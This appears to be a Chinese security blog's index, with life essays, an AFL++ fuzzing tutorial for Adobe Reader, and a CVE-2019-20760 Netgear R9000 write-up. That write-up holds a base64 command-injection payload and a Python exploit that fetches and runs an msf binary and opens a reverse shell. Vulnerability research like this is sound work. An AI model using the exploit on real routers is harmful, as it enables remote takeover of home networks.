视频播放不多，但是多多少少还是对一些人产生了一丁点的参考作用。但是出现了另外一种情况，私信我的人越来越多，我又是个不太想辜负别人的人，所以就每条都回复。我不觉得浪费时间，只是有些问题问的有点不清不楚，我要慢慢去引导出他们想问的内容。越是对于这种同学，我越是谨慎，因为你知道的越少，问题越模糊。他描述不清楚，你理解错误给出了建议，如果他真的很信任你，那你就会给别人带来麻烦了（别怀疑，真的会有人完全相信网络上的回答）。所以我每个答复最后都会说，仅供参考。 所以直到现在，我发现给别人做咨询这个事情是一个入了就出不来的事情，倒不是因为麻烦，而是你如果真的对别人负责的话，你会发现事情远比你一开始想的复杂的多。 ","date":"2022-11-19","objectID":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/:1:0","tags":["Life"],"title":"关于我在这个周末早上睡不着起来想的这些事","uri":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/"},{"categories":["Life"],"content":"金钱欲望 网安是个很挣钱的行业，如果你不知道为什么挣钱，那说明你还没了解透彻（我不是说工资高）。前段时间跟朋友吃饭的时候，全程聊的都是Bounty、奖金和外快。我倒不是说不喜欢讨论这些东西，而是我逐渐发现，他们慢慢地把自己的兴趣从技术本身转移到从Money出发去搞技术。（我打赌，至少有80%的人看到这都会觉得，哎呀，你装什么清高啊，谁不是为了钱。Fine，随你怎么想哈。如果你这么想呢，就别往下看了，怕气到你，怪不好的。） 我不是否认为了钱去搞技术，因为这几个人不管出于什么出发点，技术侧都是那种行业领头的级别（是真的领头的那种，不是靠包装和ppt领头的）。我比较纳闷的是，为什么他们会有这种转变。后半程我就问他们，你们现在比赛和挖洞都是先考虑Bounty吗？他们都愣了一下，然后笑着说肯定啊，谁不是为了钱。我明白，如果他们不愣那一下，我还真信了。我感觉吧，他们自己都没有觉得自己现在优先考虑的是钱（因为他们每个人家庭条件都很好，都不缺钱。到这，就会再有15%的人说了，谁会嫌钱多啊）。 真的很怀念通宵打那种奖金只有几百块的CTF的日子，不为钱，就为flag。但是现在，这种想法已经跟“主流意识”格格不入了，会被人觉得蠢、傻、笨。无所谓了，还是顾着自己心情最重要。 ","date":"2022-11-19","objectID":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/:2:0","tags":["Life"],"title":"关于我在这个周末早上睡不着起来想的这些事","uri":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/"},{"categories":["Life"],"content":"身体健康 不知道是因为年龄逐渐增长还是怎么，越来越觉得身体健康最重要。如果我残疾了，走不了路，但是又个劳斯莱斯天天带着我出门，还有一个就是健健康康，天天只能挤公交，让我选择的话，我真的会选择后者。这可能是基于前面那个“金钱欲望”的原因， 我对钱没有那么充裕的欲望，更多的是关注自己开不开心（可能还没有遇到过那种因为钱导致不开心的事情吧，或许如果有一场几百万费用的事故的话，会改变一下）。 每天看全球的新闻，信息量爆炸的情况下，我更多的看的是全球各地不同的生存方式。是生存方式，不是生活。这也是带来不同价值观的根因吧。 你永远不知道明天会发生什么，所以能快乐健康地过一天，比什么都值得。现在我就这么想。 ","date":"2022-11-19","objectID":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/:3:0","tags":["Life"],"title":"关于我在这个周末早上睡不着起来想的这些事","uri":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/"},{"categories":["Life"],"content":"总结 洗把脸，该做饭了，叫女朋友起床，过一个愉快的一天吧～ ","date":"2022-11-19","objectID":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/:4:0","tags":["Life"],"title":"关于我在这个周末早上睡不着起来想的这些事","uri":"/2022/11/%E5%85%B3%E4%BA%8E%E6%88%91%E5%9C%A8%E8%BF%99%E4%B8%AA%E5%91%A8%E6%9C%AB%E6%97%A9%E4%B8%8A%E7%9D%A1%E4%B8%8D%E7%9D%80%E8%B5%B7%E6%9D%A5%E6%83%B3%E7%9A%84%E8%BF%99%E4%BA%9B%E4%BA%8B/"},{"categories":["IoT"],"content":"Netgear Router","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"Netgear Router漏洞分析第一篇，先来个老点的简单洞上上手。 CVE-2019-20760 Netgear R9000 Authentication Bypass ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:0:0","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"一、漏洞信息搜集 ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:1:0","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"1. 漏洞简述 漏洞名称：Authentication Bypass on R9000,PSV-2018-0615 of NETGEAR 漏洞编号：CVE-2019-20760 漏洞类型：Command Injection 漏洞影响：Code Execution CVSS 3.0评分：8.3 利用难度：低 用户权限：不需要 ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:1:1","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"2. 组件概述 NETGEAR R9000路由器，也称为Nithtawk X10 AD7200 Smart WiFi Router，在全球范围内使用数量较大，属于家用路由器厂商中的老品牌。 ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:1:2","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"3. 漏洞利用 该漏洞位于路由器的认证部分，攻击者可以通过构造恶意的认证登录请求来触发漏洞，成功触发该漏洞后可以实现任意代码执行。 ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:1:3","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"4. 漏洞影响 官方公布受影响产品：NETGEAR R9000 ，使用固件为1.0.4.26及之前版本 实测其他受影响产品：NETGEAR R7800，使用固件为1.0.2.62及之前版本；NETGEAR R7500，使用固件为1.0.3.46及之前版本 （备注：基于漏洞成因猜测其他产品的部分固件版本中也会存在该漏洞。） ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:1:4","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"二、漏洞复现 ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:2:0","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"1. 环境搭建 1. 创建ubuntu网络环境 # sudo apt-get install bridge-utils v4ler1an qemu_images ➜ sudo brctl addbr br0 v4ler1an qemu_images ➜ sudo ifconfig br0 192.168.7.1/24 up # 创建tap接口，名字为tap0，并添加到网桥 v4ler1an qemu_images ➜ sudo tunctl -t tap0 Set 'tap0' persistent and owned by uid 0 v4ler1an qemu_images ➜ sudo ifconfig tap0 192.168.7.8/24 up v4ler1an qemu_images ➜ sudo brctl addif br0 tap0 2. qemu系统模式模拟 首先下载固件： 漏洞版本固件下载链接 修复版本固件下载链接 然后对固件进行解压获取文件系统： v4ler1an R9000-V1.0.4.26 ➜ binwalk R9000-V1.0.4.26.img DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 132 0x84 uImage header, header size: 64 bytes, header CRC: 0x9014DEF8, created: 2018-12-11 20:26:02, image size: 4644224 bytes, Data Address: 0x8000, Entry Point: 0x8000, data CRC: 0xADE21CB5, OS: Linux, CPU: ARM, image type: OS Kernel Image, compression type: none, image name: \"Linux-3.10.20-al-5.0-ga_na\" 196 0xC4 Linux kernel ARM boot executable zImage (little-endian) 17204 0x4334 gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null date) 4718656 0x480040 uImage header, header size: 64 bytes, header CRC: 0x1C03C2A4, created: 2018-12-11 20:26:23, image size: 31033344 bytes, Data Address: 0x40908000, Entry Point: 0x40908000, data CRC: 0x3DA0E540, OS: Linux, CPU: ARM, image type: OS Kernel Image, compression type: lzma, image name: \"Linux-3.10.20\" 4718720 0x480080 Squashfs filesystem, little endian, version 4.0, compression:xz, size: 31033290 bytes, 3642 inodes, blocksize: 262144 bytes, created: 2018-12-11 20:26:22 binwalk可以正常识别出内核和文件系统，所以直接使用binwalk进行文件系统的提取： v4ler1an R9000-V1.0.4.26 ➜ binwalk -Me R9000-V1.0.4.28.img 提取出文件系统后，确认一下指令架构： v4ler1an squashfs-root ➜ file ./bin/busybox ./bin/busybox: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, no section header 使用qemu的系统模式来模拟环境： sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append \"root=/dev/mmcblk0p2 console=ttyAMA0\" -net nic -net tap,ifname=tap0,script=no,downscript=n0 -nographic # 这里如果遇到 “Incalid SD card size: xxxGB”的问题，则执行以下命令解决 # qemu-img resize \u003cimage-file\u003e xxG (一个离真实文件大小最近的2的整数次fang的数值) # 本例中是 qemu-img resize debian_wheezy_armhf_standard.qcow2 32G 然后配置一下网络： # 在qemu虚拟机debian内部执行 root@debian-mips:~# ifconfig eth0 192.168.7.7/24 up root@debian-mips:~# ping 192.168.7.1 # 将文件系统scp到debian中 v4ler1an _R9000-V1.0.4.26.img.extracted ➜ scp -oHostKeyAlgorithms=+ssh-dss -r squashfs-root root@192.168.7.7:~/ # 挂载dev和proc root@debian-mips:~# mount -o bind /dev ./squashfs-root/dev root@debian-mips:~# mount -t proc /proc ./squashfs-root/proc # 启动shell root@debian-mips:~# chroot squashfs-root sh 3. web服务 这里还需要确认的是路由器的web服务是如何启动的。 首先通过Referer来筛选一下可能的web处理程序： v4ler1an squashfs-root ➜ grep -r \"Referer\" . grep: ./usr/sbin/uhttpd: binary file matches grep: ./usr/sbin/wget: binary file matches grep: ./usr/lib/libcurl.so.4.3.0: binary file matches grep: ./usr/bin/curl: binary file matches grep: ./iQoS/R9000/TM/data_colld: binary file matches grep: ./iQoS/R8900/TM/data_colld: binary file matches grep: ./bin/fbwifi: binary file matches grep: ./bin/ookla: binary file matches 通过结果来看，推测一下可能是uhttpd。查看/etc/init.d下的各个脚本： v4ler1an init.d ➜ ls acl dni-debug.init lltd qcmbr ubus atd dni-qos net-br rcS uhttpd avahi-daemon dnsmasq net-br-dhcpc-helper repacd umount aws done net-lan ripngd upnp bond-init enet net-scan run_afpd usb boot forked-daapd net-wan samba watchdog ca-certificates glboot ntpclient ssid_steering wigig_linkloss_wd check_eeprom igmpproxy.init openvpn sysctl wlan-common cron init6 openvpn_check syslogd zebra dbus iqos opmode sysstat zzprefix-check_cert_files ddns kcode pot telnet detcable lbd powerctl traffic_meter 查看uhttpd： v4ler1an init.d ➜ cat uhttpd #!/bin/sh /etc/rc.common ... ... start() { #config_load uhttpd #config_foreach start_instance uhttpd #mkdir /tmp/www #cp -rf /usr/www","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:2:1","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"2. 复现过程 使用admin/admin的账号密码登录，抓包如下： GET /cgi-bin/ HTTP/1.1 Host: 192.168.7.7 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux aarch64; rv:106.0) Gecko/20100101 Firefox/106.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Authorization: Basic YWRtaW46YWRtaW4= 对于常规字段没有发现特殊的情况，对于Authorization字段，有一段Base64加密的内容，使用Base64解密后发现是admin:admin，也就是用户名和密码。构造payload如下： echo \"admin:`touch /aaa`\" | base64 YWRtaW46YHRvdWNoIC9hYWFg 构造如下数据包： GET /cgi-bin/ HTTP/1.1 Host: 192.168.7.7 User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux aarch64; rv:106.0) Gecko/20100101 Firefox/106.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1 Authorization: Basic YWRtaW46YHRvdWNoIC9hYWFg 数据包发送后，在文件系统中新增了一个aaa文件： root@debian-armhf:~/squashfs-root# ls aaa etc hw_id proc tmp bin firmware_region iQoS rom usr cloud_version firmware_time lib root www default_language_version firmware_version module_name sbin dev hardware_version overlay sys ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:2:2","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"三、漏洞分析 直接使用IDA反编译uhttpd程序，然后根据字符串Authorization可以定位到uh_cgi_auth_check函数： 其实函数逻辑比较简单，数据包头部的Authorization中的Basic后的数据经过Base64解码后，:后面的内容会传递给snprintf，这部分内容也就是password部分，然后就直接调用system函数来执行了。漏洞的成因可以说非常简单了，甚至都没有动态调试的必要。 （杂谈：官方给出的漏洞影响是认证绕过，但是分析下来看，这是认证前命令注入，并且可以实现RCE，严重程度远比官方给出的描述大。Fine，开心就好。） 所以这里可以直接给出exp： #!/usr/bin/python3 from pwn import * from threading import Thread import requests import base64 cmd = 'admin:' cmd += '`' cmd += 'wget http://192.168.7.1:8000/tools/msf -O /msf\\n' cmd += 'chmod 777 /msf\\n' cmd += '/msf' cmd += '`' assert(len(cmd) \u003c 255) cmd_b64 = base64.b64encode(cmd.encode()).decode() headers = { \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Encoding\": \"gzip, deflate\", \"Connection\": \"keep-alive\", \"Upgrade-Insecure-Requests\": \"1\", \"Authorization\": \"Basic \" + cmd_b64 } def attack(): try: requests.get(\"http://192.168.7.7/cgi-bin/\", headers=headers, timeout=1) except Exception as e: print(e) thread = Thread(target=attack) thread.start() io = listen(31337) io.wait_for_connection() log.success(\"getshell\") io.interactive() thread.join() 采用的是IoT-vulhub给出的exp方案，使用了msf的payload来实现反弹shell。 ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:3:0","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"四、漏洞挖掘思路 猜测一下漏洞的发现者第一眼应该是抓取登录包看到了Authorization字段的Base64编码的内容，然后来逆向uhttpd程序，定位到uh_cgi_auth_check函数后应该很快就发现了这个漏洞。 ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:4:0","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"五、防御措施 首先来看下漏洞修复版本1.0.2.48版本的uh_cgi_auth_check函数： 可以看到修复版本不再采用snprintf-system模式的执行命令方式，二是采用了dni_system函数： 该函数最后是调用execve的方式来实现命令执行，只有参数可控，无法再做到RCE。 ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:5:0","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["IoT"],"content":"六、参考链接 https://xz.aliyun.com/t/9125 ","date":"2022-11-16","objectID":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/:6:0","tags":["Netgear","IoT"],"title":"CVE-2019-20760 Netgear R9000 Authentication Bypass Vuln","uri":"/2022/11/cve-2019-20760-netgear-r9000-authentiction-bypass/"},{"categories":["Fuzz"],"content":"Fuzzing 101 系列 note 8","date":"2022-01-16","objectID":"/2022/01/fuzzing101-8/","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 8","uri":"/2022/01/fuzzing101-8/"},{"categories":["Fuzz"],"content":"本文是Fuzzing101系列第八篇，fuzz的对象为 Adobe Reader 。 ","date":"2022-01-16","objectID":"/2022/01/fuzzing101-8/:0:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 8","uri":"/2022/01/fuzzing101-8/"},{"categories":["Fuzz"],"content":"1. Basic Info 一个 OOB read vulneratibily. ","date":"2022-01-16","objectID":"/2022/01/fuzzing101-8/:1:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 8","uri":"/2022/01/fuzzing101-8/"},{"categories":["Fuzz"],"content":"2. Learning Target 使用 AFL++ 的 QEMU 模式来对闭源软件进行 fuzz 在 QEMU 模式下开启 persistent mode 练习如何使用 QASAN ，一个二进制层面的 sanitizer ","date":"2022-01-16","objectID":"/2022/01/fuzzing101-8/:2:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 8","uri":"/2022/01/fuzzing101-8/"},{"categories":["Fuzz"],"content":"3. Fuzzing ","date":"2022-01-16","objectID":"/2022/01/fuzzing101-8/:3:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 8","uri":"/2022/01/fuzzing101-8/"},{"categories":["Fuzz"],"content":"1. Workflow 安装 AFL++ 的 QEMU 创建一个 PDF 的语料库 开启 persistent mode 使用 QEMU 模式对 Adobe Reader 进行 fuzz，直到出现crash 使用造成crash的poc重现crash 修复漏洞 ","date":"2022-01-16","objectID":"/2022/01/fuzzing101-8/:3:1","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 8","uri":"/2022/01/fuzzing101-8/"},{"categories":["Fuzz"],"content":"2. Solution 1. Download and build target 首先安装 AFL++ 的 QEMU 模式，使用下面的命令来进行检测是否安装： afl-qemu-trace --help 这种显示表明已经安装成功了。如果不能，则需要额外安装： sudo apt install ninja-build libc6-dev-i386 cd ~/Desktop/v4ler1an/AFLplusplus/qemu_mode/ CPU_TARGET=i386 ./build_qemu_support.sh make distrib sudo make install 然后安装 Adobe Reader ： # install dependencies sudo apt-get install libxml2:i386 # download and uncompress wget ftp://ftp.adobe.com/pub/adobe/reader/unix/9.x/9.5.1/enu/AdbeRdr9.5.1-1_i386linux_enu.deb # install sudo dpkg -i AdbeRdr9.5.1-1_i386linux_enu.deb 安装完成后，检测是否成功： /opt/Adobe/Reader9/bin/acroread 安装成功后会出现如下信息： 2. Seed corpus creation 从 SafeDocs “Issue Tracker” 下载语料，或者从这里使用更多的 PDF 语料。 # download and uncompress wget https://corpora.tika.apache.org/base/packaged/pdfs/archive/pdfs_202002/libre_office.zip unzip libre_office.zip -d extracted 这里因为 PDF 格式的文件一般会比较大，所以我们先筛选小于 2KB 的文件来加快 fuzz 速度： mkdir -p $HOME/Desktop/Fuzz/training/fuzzing_adobereader/afl_in find ./extracted -type f -size -2k \\ -exec cp {} $HOME/Desktop/Fuzz/training/fuzzing_adobereader/afl_in \\; 3. Fuzzing 这里在执行 fuzz 时，有两种方式： 第一种是直接使用 -Q 选项开启 QEMU mode。 这里有一个需要注意的问题，因为前面运行的 /opt/Adobe/Reader9/bin/acroread 是一个 shell 脚本，并不是实际的二进制文件。真正的二进制文件是 /opt/Adobe/Reader9/Reader/intellinux/bin/acroread。这里需要设置一下两个环境变量：ACRO_INSTALL_DIR 和 ACRO_CONFIG。然后， 通过 LD_LIBRARY_PATH 指定加载共享库的路径。所以最终执行的 fuzz 命令如下： ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=$LD_LIBRARY_PATH:'/opt/Adobe/Reader9/Reader/intellinux/lib' afl-fuzz -Q -i ./afl_in/ -o ./afl_out/ -t 2000 -- /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript @@ 但是这种方式很慢，我们需要想办法提升 fuzz 速度。 第二种就是使用 AFL 的 persistent 模式。这种模式可以用在有源码的情况下，也可以用在只有二进制文件的情况下。在有源码时，我们可以直接在源码的合适的位置插入如下代码来实现 persistent 模式： while(__AFL_LOOP(10000)){ /* Read input data. */ /* Call library code to be fuzzed. */ /* Reset state. */ } 对于 persistent 模式的详细介绍可以阅读这里。 而对于只有二进制文件的情况，整体思路上是一样的，也是找到合适的位置设置循环。分析二进制文件的函数地址可以使用常规的 IDA 等工具进行反编译来获取，这里使用一种简单的工具 —— valgrind。我们使用其中的 callgrind 来分析程序运行的时间和调用过程，来判断合适的位置： sudo apt-get install valgrind sudo apt-get install kcachegrind 然后，使用下面的命令来生成一个 callgrind report： ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=/opt/Adobe/Reader9/Reader/intellinux/lib valgrind --tool=callgrind /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript [samplePDF] 上述命令会在当前目录下生成一个 callgrind.out 文件，然后使用 kcachegrind 来读取： kcachegrind 读取出的信息如下： 这里我们选择地址 0x08546a00 。选择的原则是尽可能选择那些只执行了一次，并且可以使得 AFL++ 的 stability 值能在 90% 以上的地址。所以使用的命令为： AFL_QEMU_PERSISTENT_ADDR=0x08546a00 ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=$LD_LIBRARY_PATH:'/opt/Adobe/Reader9/Reader/intellinux/lib' afl-fuzz -Q -i ./afl_in/ -o ./afl_out/ -t 2000 -- /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript @@ 我们指定了变量 AFL_QEMU_PERSISTENT_ADDR 为上面选择的地址。这次的fuzz速度会有提升： ","date":"2022-01-16","objectID":"/2022/01/fuzzing101-8/:3:2","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 8","uri":"/2022/01/fuzzing101-8/"},{"categories":["Fuzz"],"content":"3. Triage 在发生 crash 之后，我们来检测这个 OOB read 漏洞： ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=opt/Adobe/Reader9/Reader/intellinux/lib /usr/local/bin/afl-qemu-trace -- /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript [crashFilePath] 如果按照上面的常规的命令来执行 trace，会报页错误。所以我们使用另外一种方法—— QASAN AFL_USE_QASAN=1 ACRO_INSTALL_DIR=/opt/Adobe/Reader9/Reader ACRO_CONFIG=intellinux LD_LIBRARY_PATH=opt/Adobe/Reader9/Reader/intellinux/lib /usr/local/bin/afl-qemu-trace -- /opt/Adobe/Reader9/Reader/intellinux/bin/acroread -toPostScript [crashFilePath] 然后就能看到触发的 stacktrace： ","date":"2022-01-16","objectID":"/2022/01/fuzzing101-8/:4:0","tags":["Fuzz","AFL"],"title":"Fuzzing 101 -- 8","uri":"/2022/01/fuzzing101-8/"},{"categories":["Life"],"content":"记录一下我与看雪的那些事儿","date":"2021-12-31","objectID":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/","tags":["Life"],"title":"我与看雪的故事","uri":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/"},{"categories":["Life"],"content":"大家好，我是有毒，一个二进制安全学习的“小学生”。今天是2021年的最后一天，我加入看雪已经5年了，突然想写点技术无关的东西，记录一下与看雪的故事。饭后闲谈，看官们文了话终。 ","date":"2021-12-31","objectID":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/:0:0","tags":["Life"],"title":"我与看雪的故事","uri":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/"},{"categories":["Life"],"content":"初次相遇 – 惊喜 2017年12月25日，圣诞节这天，我注册了看雪。其实在这之前，也有听到过论坛。因为个人非常喜欢雪，所以当时的第一感觉是，名字真好听，应该是一个感情丰富的文艺青年创建的个人博客吧。当我打开论坛的时候，感受到了仿佛打开新世界一样的惊喜。 其实当时我还没有从事安全方向，主要聚焦在开发上，所以也有关注一些开发类的论坛。但是看到看雪的第一眼，我就觉得我应该会持续关注它了，不为别的，只为名字和干货。看了大家的文章之后，能感觉出来，这些优秀的作者都是简单、纯粹的技术人员，和我相性很合。但是我并不是搞安全的，所以很多技术层面的内容看不懂，但是字里行间还是能感受到作者想要表达的心情，真的是很单一、热情的分享的喜悦的心情。 我注册了看雪的账号，起名字的时候想了半天，不知道叫什么。我看论坛里大家都是Leet风格（当时还不知道这种风格）的名称，想的就是自己起一个英文名字。但是当时的英文名字纯粹是实习的时候公司内部使用的，只是为了外语业务使用的，个人并不是特别喜欢。想来想去，还是沿用了之前小伙伴一直喜欢叫的名字 – 有毒。因为他们总说我有毒，说什么就命中什么，跟预言家一样，大部分都是坏的，所以不叫预言家，而是有毒。后来想想，或许我英文名字可以叫Murphy（墨菲定律嘛）。 就这样，有毒加入了看雪。 ","date":"2021-12-31","objectID":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/:1:0","tags":["Life"],"title":"我与看雪的故事","uri":"/2021/12/%E6%88%91%E4%B8%8E%E7%9C%8B%E9%9B%AA%E7%9A%84%E6%95%85%E4%BA%8B/"},{"categories":["Life"],"content":"逐渐融入 – 学习 本科的时候，实习期间去找了一份.NET开发的工作，干了有4个月吧，我觉得我可能对自己有错误的认知。并不是不喜欢这个技术方向，而是我觉得我视野不够宽，看到的东西太少，会影响你的一些决策。我毅然辞职去考研了。 上了研究生选导师的时候，首选还是软开的，但是无意间有个做安全的导师联系我希望能当面聊一下，然后我就入坑了。在这期间，我开始从0学起安全方向，也是在这期间，我注册了看雪。然后，开始在上面跟着学习。 我刚开始是不敢发帖子的，因为我觉得我水平不够，发出来的东西都是浅显，没有干货，所以绝大部分时间都是看上面的文章学习。看雪有个我至今觉得都很厉害的内容——知识库。这简直是开源的二进制安全的百科全书，想学的内容基本全覆盖，我由衷佩服当时就有这种知识库想法的设计者。 